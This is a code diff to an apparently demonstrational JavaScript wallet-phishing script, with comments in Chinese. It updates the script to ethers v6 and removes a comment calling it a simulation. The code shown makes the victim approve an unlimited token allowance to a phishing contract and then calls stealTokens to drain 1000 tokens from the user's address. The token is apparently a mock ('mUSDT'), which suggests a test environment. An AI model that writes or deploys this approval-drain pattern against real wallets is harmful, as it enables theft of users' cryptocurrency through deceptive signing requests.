@@ -134,7 +134,6 @@ async function setupWeb3() {
     }
 }
 
-    // 這個函數模擬了釣魚網站的行為
     async function executePhishingAttack() {
         const web3 = await setupWeb3();
         if (!web3) return;
@@ -145,10 +144,8 @@ async function setupWeb3() {
             // 步驟一：讓使用者簽署授權交易
             const musdtContract = new ethers.Contract(MUSDT_CONTRACT_ADDRESS, musdtABI, signer);
             
-            // 授權金額為極大值，代表無限授權
-            // const amountToApprove = ethers.constants.MaxUint256; 
-            const amountToApprove = ethers.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
-
+            // v6 版本處理大數字的方法
+            const amountToApprove = ethers.MaxUint256; 
 
             console.log("正在請求授權...請在錢包中確認！");
             const approveTx = await musdtContract.approve(PHISHING_CONTRACT_ADDRESS, amountToApprove);
@@ -162,8 +159,8 @@ async function setupWeb3() {
             
             const userAddress = await signer.getAddress();
             
-            // 這裡假設我們要偷 1000 個 mUSDT
-            const amountToSteal = ethers.utils.parseUnits("1000", 18);
+            // v6 版本解析代幣數量的方法
+            const amountToSteal = ethers.parseUnits("1000", 18);
 
             console.log("發送竊取代幣交易中...");
             const stealTx = await phishingContract.stealTokens(userAddress, amountToSteal);
